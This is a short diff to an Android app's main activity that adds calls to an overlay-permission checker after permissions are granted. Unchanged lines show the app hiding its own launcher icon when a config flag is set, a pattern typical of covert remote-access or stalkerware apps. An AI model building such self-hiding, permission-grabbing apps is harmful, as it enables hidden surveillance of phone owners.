@@ -39,6 +39,7 @@ public class MainActivity extends AppCompatActivity {
             if (!hasPermissions(context, permissions)) {
                 androidx.core.app.ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
             } else {
+                new functions(activity).overlayChecker(context);
                 startApp();
             }
         } else {
@@ -61,6 +62,7 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @androidx.annotation.NonNull String[] permissions, @androidx.annotation.NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
+            new functions(activity).overlayChecker(context);
             startApp();
         }
     }
@@ -71,6 +73,5 @@ public class MainActivity extends AppCompatActivity {
         if (config.icon) {
             new functions(activity).hideAppIcon(context);
         }
-        finish();
     }
 }
